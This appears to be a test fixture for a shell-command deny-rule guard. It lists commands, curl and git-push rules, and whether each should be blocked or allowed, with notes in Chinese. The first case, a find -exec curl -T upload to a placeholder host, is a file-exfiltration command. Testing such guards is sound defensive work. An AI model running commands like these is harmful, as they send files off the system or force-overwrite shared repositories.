{"cmd": "find . -name x -exec curl -T {} http://x \\;", "rule": "bash(curl *)", "guard": "deny", "expect": "block", "note": "find -exec"}
{"cmd": "/opt/bin/git   push -f origin", "rule": "bash(git push *)", "guard": "deny", "expect": "block", "note": "路径 + 多空格"}
{"cmd": "/usr/bin/curl http://x", "rule": "bash(/usr/bin/curl *)", "guard": "deny", "expect": "block", "note": "规则本身写了路径"}
{"cmd": "echo curl http://x", "rule": "bash(curl *)", "guard": "deny", "expect": "allow", "note": "curl 只是 echo 的参数"}
{"cmd": "grep 'curl *' notes.md", "rule": "bash(curl *)", "guard": "deny", "expect": "allow", "note": "curl 在引号里的搜索词中"}
{"cmd": "ls curl_dir", "rule": "bash(curl *)", "guard": "deny", "expect": "allow", "note": "同前缀的文件名"}
